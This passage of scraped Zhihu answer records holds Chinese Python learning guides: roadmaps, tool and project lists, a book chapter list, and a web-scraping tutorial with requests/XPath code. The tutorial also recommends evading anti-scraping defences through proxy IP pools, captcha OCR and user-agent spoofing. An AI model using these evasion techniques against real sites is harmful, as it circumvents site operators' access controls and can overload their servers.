baby,python rocks!” 如何统计里面字母o出现的次数！思路：遍历字符串，定义一个变量，每次o出现，都+12.给你一个字符串“come baby,python rocks!” 如何统计这里面所有字母出现的次数！（普通变量肯定无法完成。）思路：需要使用字典这类复杂的数据结构处理，字母当key，出现的次数当value，每个key出现，对应的value+13.给你一个字符串“come baby,python rocks!” 如何统计这里面字母出现次数的前三名！思路：排序，取出前三后续扩展练习：1.给你一个字符串“come baby,python rocks!” 怎么统计出现次数前三的字母。2.一个nginx日志文件，怎么统计IP出现次数前三的url。3.一个nginx日志文件，统计IP出现前三后，如何存入MySQL数据库。4.存入MySQL中的日志文件，如何输出给浏览器端显示。5.如何美化前端表格等等。4.重要学习部分：python库怎么学模块将多个代码块（按功能）定义到同一个文件中。别的文件中使用时则先导入模块，在调用模块内变量或函数。模块命名要符合python变量的命名规范1.建议全小写英文字母和数字2.避免与常用模块或第三方模块名称冲突控制模块内代码在使用python mod.py时执行，在导入时不执行1.通过Global内变量__name__进行判断2.当以python mod.py运行脚本时__name__变量为__main__字符串3.当以模块导入时__name__为模块名称字符串包将不同模块文件放在不同文件夹内，包文件夹下面需要有__init__.py文件用以声明该文件为Python包。使用时需要从包内导入模块后调用模块中变量和函数。常用系统模块：os,sys,time,datetime,urllib,xml,json,email,csv,collections,math,zipfile,trafile,hashlib常用三方模块：requests,pyquery,django,flask,mysqlclient,paramiko,redis,lxml,dateutils,ipaddr,netaddr模块学习方法：1.先知道有没有2.用的时候在查内置工具：dir、help搜索引擎：google、百度5.再说一个python目前一个热点：python Web应用（python全栈）1.Python基础入门（入门、数据类型、条件表达、循环语句）2.Python基础进阶（文件操作、函数、装饰器、模块、面向对象、网络编程）3.Python前端知识（Html、Css、Js、Jquery、Bootstrap、）4.Python高级用法（Django、Flask、数据库操作、MVC、ORM、Admin、template）5.Python项目实战（电商项目、爬虫项目、常用组件、运维项目、代码调优）6.Python高级进阶（数据算法、代码规范、面试技巧）重要：多抄、多写、多想、多问、多看、多听、多说1.学习编程就是为了解决实际的问题，把自己在工作或学习中的重复工作程序化2.谷歌和度娘3.加入开源社区（多看、多分享、多交流）4.参加培训辅导（仔细听课、跟上课堂学习，有问题做记录，课后查阅资料或请求他人）5.善于记录笔记，不断总结，查漏补缺。6.python前景之一：大数据分析1.python基础入门（入门、数据类型、条件表达、循环语句）2.python基础进阶（文件操作、函数、装饰器、模块、面向对象、网络编程）3.python数据采集：（外部数据源导入分析&amp;爬虫自己采集数据源分析）4.数据分析：（各种库，如Pandas库，Numpy库必备数据库）5.数据可视化：（matplotlib库）重要：实用即可，最具价值，切莫花哨不适用7.python前景之二：机器学习直接看应用吧：看起来是个云端的概念1.计算机视觉典型的应用包括：人脸识别、车牌识别、扫描文字识别、图片内容识别、图片搜索等等。2.自然语言处理典型的应用包括：搜索引擎智能匹配、文本内容理解、文本情绪判断，语音识别、输入法、机器翻译等等。3.社会网络分析典型的应用包括：用户画像、网络关联分析、欺诈作弊发现、热点发现等等。4.推荐典型的应用包括：虾米音乐的“歌曲推荐”，某宝的“猜你喜欢”等等。学习路线：数学基础：微积分、线性代数、概率与统计、典型算法2.编程语言、工具和环境:pythonpython有着全品类的数据科学工具，从数据获取、数据清洗到整合各种算法都做得非常全面。网页爬虫: scrapy数据挖掘: pandas：模拟R，进行数据浏览与预处理。numpy：数组运算。scipy：高效的科学计算。matplotlib：非常方便的数据可视化工具。机器学习: scikit-learn：远近闻名的机器学习package。未必是最高效的，但是接口真心封装得好，几乎所有的机器学习算法输入输出部分格式都一致。而它的支持文档甚至可以直接当做教程来学习，非常用心。对于不是非常高纬度、高量级的数据，scikit-learn胜任得非常好(有兴趣可以看看sklearn的源码，也很有意思)。libsvm：高效率的svm模型实现(了解一下很有好处，libsvm的系数数据输入格式，在各处都非常常见)keras/TensorFlow：对深度学习感兴趣的同学，也能很方便地搭建自己的神经网络了。自然语言处理: nltk：自然语言处理的相关功能做得非常全面，有典型语料库，而且上手也非常容易。交互式环境： ipython notebook：能直接打通数据到结果的通道，方便至极。强力推荐。3.编程语言、工具和环境:RR最大的优势是开源社区，聚集了非常多功能强大可直接使用的包，绝大多数的机器学习算法在R中都有完善的包可直接使用，同时文档也非常齐全。常见的package包括：RGtk2, pmml, colorspace, ada, amap, arules, biclust, cba, descr, doBy, e1071, ellipse等等。另外，值得一提的是R的可视化效果做得非常不错，而这对于机器学习是非常有帮助的。4.其他语言相应资深程序员GG的要求，再补充一下Java和C++相关机器学习package。Java系列WEKA Machine Learning Workbench 相当于java中的scikit-learn其他的工具如 Massive Online Analysis（MOA）、MEKA 、 Mallet等也非常有名。C++系列mlpack，高效同时可扩充性非常好的机器学习库。Shark：文档齐全的老牌C++机器学习库。8.相关学习文档资料：目前比较好的文档还是英文，国内资料没有可以加我的学习群473391225，自己去下载。国内python资源汇总​pan.baidu.com----------------------------------------------------------------------------------------------2018/05/25更新：开发文档资源整理（一）环境管理管理 Python 版本和环境的工具p：非常简单的交互式 python 版本管理工具。官网pyenv：简单的 Python 版本管理工具。官网Vex：可以在虚拟环境中执行命令。官网virtualenv：创建独立 Python 环境的工具。官网virtualenvwrapper：virtualenv 的一组扩展。官网包管理管理包和依赖的工具。pip：Python 包和依赖关系管理工具。官网pip-tools：保证 Python 包依赖关系更新的一组工具。官网conda：跨平台，Python 二进制包管理工具。官网Curdling：管理 Python 包的命令行工具。官网wheel：Python 分发的新标准，意在取代 eggs。官网包仓库本地 PyPI 仓库服务和代理。warehouse：下一代 PyPI。官网 Warehouse：PyPA 提供的 PyPI 镜像工具。官网 bandersnatchdevpi：PyPI 服务和打包/测试/分发工具。官网localshop：本地 PyPI 服务（自定义包并且自动对 PyPI 镜像）。官网分发打包为可执行文件以便分发。PyInstaller：将 Python 程序转换成独立的执行文件（跨平台）。官网dh-virtualenv：构建并将 virtualenv 虚拟环境作为一个 Debian 包来发布。官网Nuitka：将脚本、模块、包编译成可执行文件或扩展模块。官网py2app：将 Python 脚本变为独立软件包（Mac OS X）。官网py2exe：将 Python 脚本变为独立软件包（Windows）。官网pynsist：一个用来创建 Windows 安装程序的工具，可以在安装程序中打包 Python本身。官网构建工具将源码编译成软件。buildout：一个构建系统，从多个组件来创建，组装和部署应用。官网BitBake：针对嵌入式 Linux 的类似 make 的构建工具。官网fabricate：对任何语言自动找到依赖关系的构建工具。官网PlatformIO：多平台命令行构建工具。官网PyBuilder：纯 Python 实现的持续化构建工具。官网SCons：软件构建工具。官网交互式解析器交互式 Python 解析器。IPython：功能丰富的工具，非常有效的使用交互式 Python。官网bpython：界面丰富的 Python 解析器。官网ptpython：高级交互式Python解析器， 构建于python-prompt-toolkit 之上。官网文件文件管理和 MIME（多用途的网际邮件扩充协议）类型检测。imghdr：（Python 标准库）检测图片类型。官网mimetypes：（Python 标准库）将文件名映射为 MIME 类型。官网path.py：对 os.path 进行封装的模块。官网pathlib：（Python3.4+ 标准库）跨平台的、面向对象的路径操作库。官网python-magic：文件类型检测的第三方库 libmagic 的 Python 接口。官网Unipath：用面向对象的方式操作文件和目录。官网watchdog：管理文件系统事件的 API 和 shell 工具官网", "praise_num": 618, "answer_object_id": "86ca6818a1070b8303bb9bba9e25eaf9"},{"answer_url": "https://www.zhihu.com/question/29372574/answer/88744491", "answer_id": 88744491, "comments_num": 226, "answer_article": "补充了几个数据分析的项目，目前是33个Python项目，会继续保持更新。Learn by doing才是正确的技术学习姿势。20171009更新：NBA常规赛结果预测--利用Python进行比赛数据分析Python 气象数据分析20161230更新：Python基于共现提取《釜山行》人物关系20160918更新：Python - Python3 实现火车票查询工具20160816更新：Python - 高德API+Python解决租房问题20160802更新：Python - Python3 色情图片识别………………………………………………分隔线………………………………………………最近几天刚好在整理Python项目，项目由易到难，代码量从几十行到几千行，在实验环境里保证可以全部完成。找到你认为有趣的去实现它，把项目做出来，知识才能变成自己的：）(建议PC端访问，边看教程边在环境里动手实践，手机上仅可查看教程)入门和进阶篇均为免费课程，可以免费使用在线练习环境。入门篇1.Python - Python 图片转字符画50 行 Python 代码完成图片转字符画小工具。&lt;img src=\"https://pic1.zhimg.com/739f35ab6c535fcb83d16a02693fa5f4_b.png\" class=\"content_image\"&gt;2.Python - 200行Python代码实现2048仅用200行的python代码完成2048小游戏的编写。3.Python - pygame开发打飞机游戏使用Python快速开发一款PC端玩耍的微信打飞机游戏，基于pygame实现。4. Python 实现简单画板要利用 Pygame 模块来自己实现一个功能更加简单的画板。&lt;img src=\"https://pic1.zhimg.com/v2-0b75bbd1f7d8d45c182e3fdbdf740600_b.png\" class=\"content_image\"&gt;5.Python - 全面解析PythonChallenge本课程带领大家一步一步攻克Python Challenge中的难题，在一个又一个脑洞大开的 Python 问题中提升自己的 Python 水平。 6.Python - 使用 Python 解数学方程介绍如何用python解决数学题。 说到数学题，相信大家都不陌生，从小学到大学都跟数学打交道。 其中初中的方程组，高中的二次曲线，大学的微积分最为头疼，今天我们将使用python 来解决方程组问题，微积分问题，矩阵化简。 7.Python - 基于 Python 的文件备份Python 做个简单的备份脚本程序，可以备份主目录和系统文件等。8.Python - Kaggle入门：泰坦尼克号幸存者项目Kaggle是一个线上数据科学竞赛类网站。本课程将使用python科学计算工具对Kaggle提供的泰坦尼克号上的人员数据进行分析建模。9.Python - Python文本解析器使用Python来解析纯文本生成一个HTML页面的小程序。10.Python - Python3实现简单的FTP认证服务器 日常生活中我们共享文件都是通过QQ，微信等软件来实现的，今天将通过本课程将教大家使用Python在自己的电脑上架设一个FTP服务器，用来管理自己日常生活中的文件。11.Python - Python 3 实现 Markdown 解析器 本课程我们将使用 Python 3 打造 Markdown 文本解析器，并且程序支持输出 HTML 格式与 PDF 格式的文件。12.Python - Python 破解验证码通过一个简单的例子来讲解破解验证码的原理。13.Python - 用Python做2048游戏通过GUI来体验编程的乐趣。14.Python - Python实现简单的Web服务器使用 Python 语言实现一个 Web 服务器，探索 HTTP 协议和 Web 服务的基本原理。进阶篇15.Python - Python3 色情图片识别使用 Python3 去识别图片是否为色情图片，我们会使用到 PIL 这个图像处理库，会编写算法来完成对划分图像的皮肤区域。&lt;img src=\"https://pic3.zhimg.com/76521ab2e38570a3204c65abcc5276a6_b.png\" class=\"content_image\"&gt;16.Python - Python实现3D建模工具本课程将基于OpenGL实现一般CAD软件都会具备的基础功能：渲染显示3D空间的画面并可以操作3D空间中物体。&lt;img src=\"https://pic2.zhimg.com/c3e9179777646c1af504f0f855078ac9_b.png\" class=\"content_image\"&gt;17.Python - Python3 实现火车票查询工具本课程使用 Python3 抓取 12306 网站信息提供一个命令行的火车票查询工具。通过该项目的实现，可以熟悉 Python3 基础及网络编程，以及 docopt，requests，prettytable 等库的使用。18.Python - Python实现基于协程的异步爬虫探讨几种实现爬虫的方法，从传统的线程池到使用协程，每节课实现一个小爬虫。另外学习协程的时候，我们会从原理入手，以ayncio协程库为原型，实现一个简单的异步编程模型。19. PyQt 实现简易浏览器基于 Python 3.4 和 PyQt 5 来学习 GUI 编程，课程分为两次实验，第一次实验先简单了解 Qt 各个组件的使用方法，第二次课程将尝试实现一个浏览器。20. Python基于共现提取《釜山行》人物关系针对《釜山行》剧本的文本，使用python编写代码分析文本中人物的共现关系，完成对《釜山行》文本的人物关系提取，并利用Gephi软件对提取的人物关系绘制人物关系图。&lt;img src=\"https://pic4.zhimg.com/v2-438fef09e3e9c512e19287f217acad5f_b.png\" class=\"content_image\"&gt;21.Python - 使用 Python 3 编写系列实用脚本使用 Python 3 来编写一系列的实用脚本，实验的过程中能熟悉 Python 3 的使用，学习使用各种功能强大的模块。22.Python - Python实现Python解释器从实现一个玩具解释器开始学习解释器基本知识,然后考察Python字节码进一步学习理解Python解释器的内部机制，最终实现一个500行以内的Python解释器。23.Python - 高德API+Python解决租房问题编写Python脚本爬取某租房网站的房源信息，利用高德的 js API 在地图上标出房源地点，划出距离工作地点1小时内可到达的范围，附上公交路径规划功能查看不同路径的用时。&lt;img src=\"https://pic3.zhimg.com/a54f86931f81b48790b50736bf542ac2_b.jpg\" class=\"content_image\"&gt;24.Python - 基于Flask/RethinkDB/Backbone.js实现TODO List使用 RethinkDB，Flask 与 Backbone.js 制作一个简单的 todo list。25.Python 气象数据分析对意大利北部沿海地区的气象数据进行分析与可视化。26.NBA常规赛结果预测--利用Python进行比赛数据分析利用NBA在2015~2016年的比赛统计数据进行回归模型建立，最终在今年2016~2017的常规赛中预测每场比赛的输赢情况。&lt;img src=\"https://pic2.zhimg.com/v2-b0912d1326b1d4928b833f2494574255_b.jpg\" data-rawwidth=\"983\" data-rawheight=\"289\" class=\"origin_image zh-lightbox-thumb\" width=\"983\" data-original=\"https://pic2.zhimg.com/v2-b0912d1326b1d4928b833f2494574255_r.jpg\"&gt;27.Python - Flask开发轻博客使用Python Flask Web框架开发一个具备基本功能的轻博客平台，在其中学习Python的Web开发。28.Python - Django 搭建简易博客本教程介绍如何一步步使用 Django 开发一个简单的博客 Web应用，涉及 Django Web开发，MVC，Template等知识点，适用于有 Python 和 Django 基础的同学。&lt;img src=\"https://pic4.zhimg.com/c510d04d5e6cd7c37b572564c8bb54bf_b.png\" class=\"content_image\"&gt;综合篇已下项目对环境占用资源较大，属于会员及训练营项目。29.Python - Python3 实现淘女郎照片爬虫 本实验通过使用 Python 实现一个淘宝女郎图片收集爬虫，学习并实践 BeautifulSoup、Selenium Webdriver 及正则表达式等知识。 30.Python - 基于 Flask 及爬虫实现微信娱乐机器人本次课程是基于 Flask Web 框架开发的娱乐级别的微信公众号后台，学习并实践 python 编程，Flask Web 开发以及微信公众平台开发机器人的基本步骤。31.Python - Python版设计模式实践多种常见的设计模式的原理以及如何应用实践,涵盖工程模式，命令模式，外观模式，适配器模式，装饰模式，代理模式等。32.Python - 仿OpenStack开发云计算管理软件使用Python语言开发一套类似OpenStack的云计算管理平台LouCloud，具备基本的用户，服务器，镜像与虚拟机管理功能。33.Python - 仿StackOverflow开发在线问答系统使用Python Flask Web开发框架实现一套类似StackOverflow的在线问答平台LouQA，具备提问，回答，评论点赞等功能。", "praise_num": 11951, "answer_object_id": "2338b437fc49e0b6c79f54dc5fb382a2"},{"answer_url": "https://www.zhihu.com/question/29372574/answer/88624507", "answer_id": 88624507, "comments_num": 135, "answer_article": "更新：兄弟们如此给力，小弟受宠若惊，好东西就是用来分享的。 500 line or less只是某个系列丛书中第四本，其他三本链接：http://www.aosabook.org/en/index.html可以在线看哦前两本每章介绍出名开源软件的架构，你说的上名字的开源基本上都能找到，短小精悍的介绍框架第三本介绍开源软件中实际遇到的一些performance的问题以及解决方案，同样浓缩啊！！ 每章的作者大多就是此开软软件的开发者啊！！！不用多说，点开你就知道啊不想看英文的怒点 http://www.ituring.com.cn/article/13057前两卷的中文版，不知道翻译的怎么样----------------------------------------割了你--------------------------------------------------------------和楼主一样在学习python， 最近找到一本python神书 500 line or less. 有兄弟提到了git的源码，这里不只是源码，而是这么一本书，目前还没出版，但是在网上有已经看到了 review版本。强烈推荐！！！强烈推荐！！！强力推荐！！！这本书共16个章节，每章均是由该领域的大牛完成，用不到500行的代码实现一个特（装）定（逼）功能。本书链接 http://aosabook.org/blog/目录页：http://aosabook.org/blog/以下是章节目录，每一章都让你热血澎湃，看完介绍你就向往下读。1. A Template Engine （http://aosabook.org/en/500L/a-template-engine.html）    MVC模型中的view层如何解析html中的静态变量和简单的语句，如下：&lt;p&gt;Welcome, {name}!&lt;/p&gt;\n&lt;p&gt;Products:&lt;/p&gt;\n&lt;ul&gt;\n{products}\n&lt;/ul&gt;\nweb中的view层不只是html代码，还有支持其他的代码。比如 {products}是一个变量。 同时view层还支持{if} , {for}, {foreach}等等。django，velocity等是如何解析他们的？大牛用不到500行代码告诉你，是如何实现的？ （不是替换，替换需要每次请求都需要解析）2. Web Spreadsheet （http://aosabook.org/en/500L/web-spreadsheet.html）   web的电子表格如何实现的？ 好像比较简单，但是介绍了 web storage 和 web worker，还是很值得一看的3. A Web Crawler http://aosabook.org/en/500L/a-web-crawler-with-asyncio-coroutines.html   不多说，几百行代码实现高效的网络爬虫， 高效！4. Static Analysis http://aosabook.org/en/500L/static-analysis.html     成熟的IDE都有代码检查和代码提示，怎么做的？ 看这章5. Clustering by Consensus http://aosabook.org/en/500L/clustering-by-consensus.html    分布式系统 paxos原理与实现。不知道paxos说明你没接触过分布式体统，接触过分布式还不懂，说明你只会用分布式系统6. A Simple Object Modle http://aosabook.org/en/500L/a-simple-object-model.html    Python是面向对象语言，对象，继承，多态，怎么用代码实现的，不到500行代码，实际不到400 行， 666.。。7. An Archaeology-Inspired Database http://aosabook.org/en/500L/an-archaeology-inspired-database.html    如何用python实现一个数据库，支持 query，index, transaction， 2，3百行代码和对每个函数的讲解。看完你就知道知道数据库原理，太值了8. Dog Bed Database http://aosabook.org/en/500L/dbdb-dog-bed-database.html   类似上一章，不过这次实现的是key-value的非关系型数据库，详细的讲解和2，3百行代码9. A 3D Modeller http://aosabook.org/en/500L/a-3d-modeller.html    用python实现一个3D设计，显示到屏幕，可以交互。不是很懂，但不明觉厉10. A Python Interpreter Written in Python http://aosabook.org/en/500L/a-python-interpreter-written-in-python.html      手把手教你如何实现python解析器。11. A Pedometer in the Real World http://aosabook.org/en/500L/a-pedometer-in-the-real-world.html       你用过手机应用记录你每天走的步数，然后发送到朋友圈吗？ （没有？ 没关系。）这章告诉你如何实现步数记录，怎么算走一步。手机中有加速记，很容易获得你某一时刻在x,y,z三个方向的加速度，用这些参数，如何计算你走了多少步？ 知道吗？ 不知道，看这章，讲解加实现12. A Continuous Intergration System http://aosabook.org/en/500L/a-continuous-integration-system.html      CI System是一个专门用来测试新代码的系统，根据代码提交记录，拿到新的代码，测试，生成报告。这不是关键，关键是 如果test失败，它还会 恢复，然后从失败的那个点在跑，相当于把出错环境重现了。。。13 A Rejection Sampler http://aosabook.org/en/500L/a-rejection-sampler.html      不是很懂，和机器学习相关，如何 计算你赢得象棋比赛的概率，天气对飞机的影响等类似的问题14 A visual programming toolkit http://aosabook.org/en/500L/blockcode-a-visual-programming-toolkit.html      不太明白15.  A Flow Shop Scheduler http://aosabook.org/en/500L/a-flow-shop-scheduler.html      flowshop调度问题，好像很出名的样子，最优化问题，如何从局部最优解找全局最优解16  Optical Character Recognition      几百行代码使用人工神经网络实现识别手写字母。。。github源码：500lines/README.md at master · aosabook/500lines · GitHub", "praise_num": 7613, "answer_object_id": "1f086c0a13d9baab483fe78d5c19c4c1"},{"question_title": "一行代码可以做什么？", "question_url": "https://www.zhihu.com/question/285586045", "question_id": 285586045, "answer_num": 520, "followers": 6035, "visitors": 9030252, "topics": "Python,编程,计算机,代码,命令提示符 (cmd)", "question_object_id": "3897abf27c0ee2f0d0fefc9d172be150", "answer_id_list": "457806145,450054820,475364790,481988416,453517491,475593167,475255922,450569526,479403570,453251748", "answer_url_list": "https://www.zhihu.com/question/285586045/answer/457806145,https://www.zhihu.com/question/285586045/answer/450054820,https://www.zhihu.com/question/285586045/answer/475364790,https://www.zhihu.com/question/285586045/answer/481988416,https://www.zhihu.com/question/285586045/answer/453517491,https://www.zhihu.com/question/285586045/answer/475593167,https://www.zhihu.com/question/285586045/answer/475255922,https://www.zhihu.com/question/285586045/answer/450569526,https://www.zhihu.com/question/285586045/answer/479403570,https://www.zhihu.com/question/285586045/answer/453251748"},{"answer_url": "https://www.zhihu.com/question/20899988/answer/255673324", "answer_id": 255673324, "comments_num": 25, "answer_article": "如果你仔细观察，就不难发现，懂爬虫、学习爬虫的人越来越多，一方面，互联网可以获取的数据越来越多，另一方面，像 Python这样的编程语言提供越来越多的优秀工具，让爬虫变得简单、容易上手。利用爬虫我们可以获取大量的价值数据，从而获得感性认识中不能得到的信息，比如：1.爬取数据，进行市场调研和商业分析。爬取知乎优质答案，为你筛选出各话题下最优质的内容。 抓取房产网站买卖信息，分析房价变化趋势、做不同区域的房价分析。爬取招聘网站各类职位信息，分析各行业人才需求情况及薪资水平。2.作为机器学习、数据挖掘的原始数据。比如你要做一个推荐系统，那么你可以去爬取更多维度的数据，做出更好的模型。3.爬取优质的资源：图片、文本、视频爬取知乎钓鱼贴\\图片网站，获得福利图片。这些事情，原本我们也是可以手动完成的，但如果是单纯地复制粘贴，非常耗费时间，比如你想获取100万行的数据，大约需忘寝废食重复工作两年。而爬虫可以在一天之内帮你完成，而且完全不需要任何干预。对于小白来说，爬虫可能是一件非常复杂、技术门槛很高的事情。比如有的人认为学爬虫必须精通 Python，然后哼哧哼哧系统学习 Python 的每个知识点，很久之后发现仍然爬不了数据；有的人则认为先要掌握网页的知识，遂开始 HTML\\CSS，结果入了前端的坑，瘁……但掌握正确的方法，在短时间内做到能够爬取主流网站的数据，其实非常容易实现。但建议你从一开始就要有一个具体的目标，你要爬取哪个网站的哪些数据，达到什么量级。在目标的驱动下，你的学习才会更加精准和高效。那些所有你认为必须的前置知识，都是可以在完成目标的过程中学到的。这里给你一条平滑的、零基础快速入门的学习路径。1.了解爬虫的基本原理及过程2.Requests+Xpath 实现通用爬虫套路3.了解非结构化数据的存储4.学习scrapy，搭建工程化爬虫5.学习数据库知识，应对大规模数据存储与提取6.掌握各种技巧，应对特殊网站的反爬措施7.分布式爬虫，实现大规模并发采集，提升效率1.了解爬虫的基本原理及过程大部分爬虫都是按“发送请求——获得页面——解析页面——抽取并储存内容”这样的流程来进行，这其实也是模拟了我们使用浏览器获取网页信息的过程。简单来说，我们向服务器发送请求后，会得到返回的页面，通过解析页面之后，我们可以抽取我们想要的那部分信息，并存储在指定的文档或数据库中。在这部分你可以简单了解 HTTP 协议及网页基础知识，比如 POST\\GET、HTML、CSS、JS，简单了解即可，不需要系统学习。2.学习 Python 包并实现基本的爬虫过程Python中爬虫相关的包很多：urllib、requests、bs4、scrapy、pyspider 等，建议你从requests+Xpath 开始，requests 负责连接网站，返回网页，Xpath 用于解析网页，便于抽取数据。如果你用过 BeautifulSoup，会发现 Xpath 要省事不少，一层一层检查元素代码的工作，全都省略了。掌握之后，你会发现爬虫的基本套路都差不多，一般的静态网站根本不在话下，小猪、豆瓣、糗事百科、腾讯新闻等基本上都可以上手了。来看一个爬取豆瓣短评的例子：&lt;img src=\"https://pic1.zhimg.com/v2-8dc02dbd124646f16583686fbb613978_b.jpg\" data-size=\"normal\" data-rawwidth=\"1394\" data-rawheight=\"888\" class=\"origin_image zh-lightbox-thumb\" width=\"1394\" data-original=\"https://pic1.zhimg.com/v2-8dc02dbd124646f16583686fbb613978_r.jpg\"&gt;选中第一条短评，右键-“检查”，即可查看源代码&lt;img src=\"https://pic1.zhimg.com/v2-e4d4b58e611791b24a17f2e7287514ec_b.jpg\" data-size=\"normal\" data-rawwidth=\"1210\" data-rawheight=\"760\" class=\"origin_image zh-lightbox-thumb\" width=\"1210\" data-original=\"https://pic1.zhimg.com/v2-e4d4b58e611791b24a17f2e7287514ec_r.jpg\"&gt;把短评信息的XPath信息复制下来我们通过定位，得到了第一条短评的XPath信息：//*[@id=\"comments\"]/ul/li[1]/div[2]/p\n但是通常我们会想爬取很多条短评，那么我们会想获取很多这样的XPath信息：//*[@id=\"comments\"]/ul/li[1]/div[2]/p\n//*[@id=\"comments\"]/ul/li[2]/div[2]/p\n//*[@id=\"comments\"]/ul/li[3]/div[2]/p\n………………………………\n观察1、2、2条短评的XPath信息，你会发现规律，只有&lt;li&gt;后面的序号不一样，恰好与短评的序号相对应。那如果我们想爬取这个页面所有的短评信息，那么不要这个序号就好了呀。通过XPath信息，我们就可以用简单的代码将其爬取下来了：import requests\nfrom lxml import etree\n\n#我们邀抓取的页面链接\nurl='https://book.douban.com/subject/1084336/comments/'\n\n#用requests库的get方法下载网页\nr=requests.get(url).text\n\n#解析网页并且定位短评\ns=etree.HTML(r)\nfile=s.xpath('//*[@id=\"comments\"]/ul/li/div[2]/p/text()')\n\n#打印抓取的信息\nprint(file)\n&lt;img src=\"https://pic3.zhimg.com/v2-8c84927c0c320eaf215a818f1680820a_b.jpg\" data-size=\"normal\" data-rawwidth=\"2236\" data-rawheight=\"654\" class=\"origin_image zh-lightbox-thumb\" width=\"2236\" data-original=\"https://pic3.zhimg.com/v2-8c84927c0c320eaf215a818f1680820a_r.jpg\"&gt;爬取的该页面所有的短评信息当然如果你需要爬取异步加载的网站，可以学习浏览器抓包分析真实请求或者学习Selenium来实现自动化，这样，知乎、时光网、猫途鹰这些动态的网站也基本没问题了。这个过程中你还需要了解一些Python的基础知识：文件读写操作：用来读取参数、保存爬下来的内容list(列表)、dict(字典)：用来序列化爬取的数据条件判断(if/else)：解决爬虫中的判断是否执行循环和迭代(for ……while)：用来循环爬虫步骤3.了解非结构化数据的存储爬回来的数据可以直接用文档形式存在本地，也可以存入数据库中。开始数据量不大的时候，你可以直接通过 Python 的语法或 pandas 的方法将数据存为text、csv这样的文件。还是延续上面的例子：用Python的基础语言实现存储：with open('pinglun.text','w',encoding='utf-8') as f:\n    for i in file:\n        print(i)\n        f.write(i)\n用pandas的语言来存储：#import pandas as pd\n#df = pd.DataFrame(file)\n#df.to_excel('pinglun.xlsx')\n这两段代码都可将爬下来的短评信息存储起来，把代码贴在爬取代码后面即可。&lt;img src=\"https://pic1.zhimg.com/v2-333df836f787ccfd973390e7df331b44_b.jpg\" data-size=\"normal\" data-rawwidth=\"1594\" data-rawheight=\"560\" class=\"origin_image zh-lightbox-thumb\" width=\"1594\" data-original=\"https://pic1.zhimg.com/v2-333df836f787ccfd973390e7df331b44_r.jpg\"&gt;存储的该页的短评数据当然你可能发现爬回来的数据并不是干净的，可能会有缺失、错误等等，你还需要对数据进行清洗，可以学习 pandas 包的基本用法来做数据的预处理，得到更干净的数据。以下知识点掌握就好：缺失值处理：对缺失数据行进行删除或填充重复值处理：重复值的判断与删除空格和异常值处理：清楚不必要的空格和极端、异常数据分组：数据划分、分别执行函数、数据重组4.掌握各种技巧，应对特殊网站的反爬措施爬取一个页面的的数据是没问题了，但是我们通常是想爬取多个页面啊。这个时候就要看看在翻页的时候url是如何变化了，还是以短评的页面为例，我们来看多个页面的url有什么不同：https://book.douban.com/subject/1084336/comments/\nhttps://book.douban.com/subject/1084336/comments/hot?p=2\nhttps://book.douban.com/subject/1084336/comments/hot?p=3\nhttps://book.douban.com/subject/1084336/comments/hot?p=4\n……………………\n通过前四个页面，我们就能够发现规律了，不同的页面，只是在最后标记了页面的序号。我们以爬取5个页面为例，写一个循环更新页面地址就好了。for a in range(5):\n    url=\"http://book.douban.com/subject/1084336/comments/hot?p={}\".format(a)\n当然，爬虫过程中也会经历一些绝望啊，比如被网站封IP、比如各种奇怪的验证码、userAgent访问限制、各种动态加载等等。遇到这些反爬虫的手段，当然还需要一些高级的技巧来应对，常规的比如访问频率控制、使用代理IP池、抓包、验证码的OCR处理等等。比如我们经常发现有的网站翻页后url并不变化，这通常就是异步加载。我们用开发者工具取分析网页加载信息，通常能够得到意外的收获。&lt;img src=\"https://pic1.zhimg.com/v2-d8e08bbfffa6690da5dd81e4d807d7c4_b.jpg\" data-size=\"normal\" data-rawwidth=\"1398\" data-rawheight=\"392\" class=\"origin_image zh-lightbox-thumb\" width=\"1398\" data-original=\"https://pic1.zhimg.com/v2-d8e08bbfffa6690da5dd81e4d807d7c4_r.jpg\"&gt;通过开发者工具分析加载的信息比如很多时候如果我们发现网页不能通过代码访问，可以尝试加入userAgent 信息。&lt;img src=\"https://pic4.zhimg.com/v2-cc0be99b32702005a3b93794f3b1a01f_b.jpg\" data-size=\"normal\" data-rawwidth=\"906\" data-rawheight=\"160\" class=\"origin_image zh-lightbox-thumb\" width=\"906\" data-original=\"https://pic4.zhimg.com/v2-cc0be99b32702005a3b93794f3b1a01f_r.jpg\"&gt;浏览器中的userAgent信息&lt;img src=\"https://pic1.zhimg.com/v2-a48215fdf230f60c64394cfb82dc3dd4_b.jpg\" data-size=\"normal\" data-rawwidth=\"1098\" data-rawheight=\"116\" class=\"origin_image zh-lightbox-thumb\" width=\"1098\" data-original=\"https://pic1.zhimg.com/v2-a48215fdf230f60c64394cfb82dc3dd4_r.jpg\"&gt;在代码中加入userAgent信息往往网站在高效开发和反爬虫之间会偏向前者，这也为爬虫提供了空间，掌握这些应对反爬虫的技巧，绝大部分的网站已经难不到你了。5.学习爬虫框架，搭建工程化的爬虫掌握前面的技术一般量级的数据和代码基本没有问题了，但是在遇到非常复杂的情况，可能仍然会力不从心，这个时候，强大的 scrapy 框架就非常有用了。scrapy 是一个功能非常强大的爬虫框架，它不仅能便捷地构建request，还有强大的 selector 能够方便地解析 response，然而它最让人惊喜的还是它超高的性能，让你可以将爬虫工程化、模块化。学会 scrapy，你可以自己去搭建一些爬虫框架，你就基本具备爬虫工程师的思维了。6.学习数据库基础，应对大规模数据存储爬回来的数据量小的时候，你可以用文档的形式来存储，一旦数据量大了，这就有点行不通了。所以掌握一种数据库是必须的，学习目前比较主流的 MongoDB 就OK。MongoDB 可以方便你去存储一些非结构化的数据，比如各种评论的文本，图片的链接等等。你也可以利用PyMongo，更方便地在Python中操作MongoDB。因为这里要用到的数据库知识其实非常简单，主要是数据如何入库、如何进行提取，在需要的时候再学习就行。7.分布式爬虫，实现大规模并发采集爬取基本数据已经不是问题了，你的瓶颈会集中到爬取海量数据的效率。这个时候，相信你会很自然地接触到一个很厉害的名字：分布式爬虫。分布式这个东西，听起来非常吓人，但其实就是利用多线程的原理让多个爬虫同时工作，需要你掌握 Scrapy + MongoDB + Redis 这三种工具。Scrapy 前面我们说过了，用于做基本的页面爬取，MongoDB 用于存储爬取的数据，Redis 